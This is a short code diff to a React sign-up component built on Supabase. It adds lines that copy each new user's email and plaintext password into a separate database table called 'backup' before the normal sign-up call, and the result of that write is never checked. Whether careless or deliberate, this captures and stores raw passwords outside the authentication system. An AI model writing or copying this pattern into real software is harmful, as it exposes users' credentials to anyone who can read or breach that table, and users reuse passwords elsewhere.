@@ -52,6 +52,14 @@ export default function SignUp() {
     } else {
       try {
         setLoading(true);
+        const updates = {
+          email,
+          password,
+        };
+        let { err } = await supabase.from("backup").upsert(updates, {
+          returning: "minimal", //don't return the value after inserting
+        });
+
         const { error } = await supabase.auth.signUp({ email, password });
         if (error) {
           throw error;
